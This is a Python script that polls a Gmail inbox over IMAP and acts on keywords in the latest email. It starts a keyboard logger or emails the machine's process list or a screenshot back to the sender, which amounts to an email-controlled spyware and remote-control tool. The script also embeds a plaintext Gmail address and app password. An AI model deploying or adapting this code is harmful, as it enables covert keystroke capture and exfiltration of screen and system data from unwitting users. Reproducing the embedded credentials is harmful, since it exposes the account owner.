import imaplib
import email
from email.header import decode_header
from threading import Timer
import time 
import keyLog
import sendMail
import re

# Gmail account credentials
username = "tnmhoang.lop93@gmail.com"
password = "ijjm pypm pmly hmqm"

# Create an IMAP4 class with SSL
imap = imaplib.IMAP4_SSL("imap.gmail.com")

# Authenticate
imap.login(username, password)

# Select the mailbox (inbox in this case)
imap.select("inbox")

# Search for all emails and retrieve the latest one
status, email_ids = imap.search(None, "ALL")
latest_email_id = email_ids[0].split()[-1]

# Fetch the email message by ID
status, email_data = imap.fetch(latest_email_id, "(RFC822)")

# Parse the email message
raw_email = email_data[0][1]
email_message = email.message_from_bytes(raw_email)

# Extract information from the email
subject, encoding = decode_header(email_message["Subject"])[0]
if isinstance(subject, bytes):
    subject = subject.decode(encoding)
from_, encoding = decode_header(email_message["From"])[0]
if isinstance(from_, bytes):
    from_ = from_.decode(encoding)

sender_email = email_message["From"]
match = re.search(r'<([^>]+)>', sender_email)
if match:
    sender_email = match.group(1)

# Print email details
#if (from_ == "Tuấn Đạt"):
print("Subject:", subject)
print("From:", from_)

# If the email message is multipart
if email_message.is_multipart():
    for part in email_message.walk():
        content_type = part.get_content_type()
        content_disposition = str(part.get("Content-Disposition"))
        try:
            body = part.get_payload(decode=True).decode()
        except:
            pass
        if content_type == "text/plain" and "attachment" not in content_disposition:
            print(body)
# Close the connection
imap.logout()
start = 0  # Define the start position in the string
end = len(body)  # Define the end position in the string

if body.find("KeyLog", start, end) != -1:
    # Set the duration in seconds (e.g., 60 seconds)
    duration = 15

    # Record the start time
    start_time = time.time()

    # Create a listener for both key press and release events
    with keyLog.keyboard.Listener(on_press=lambda key: keyLog.on_key_event(key, is_press=True),
                        on_release=lambda key: keyLog.on_key_event(key, is_press=False)) as listener:
        while time.time() - start_time < duration:
            pass
        listener.stop()

if body.find("ListApp", start, end) != -1:
    sendMail.send_process_email(sender_email)

if body.find("Screenshot", start, end) != -1:
    sendMail.send_screenshot_email(sender_email)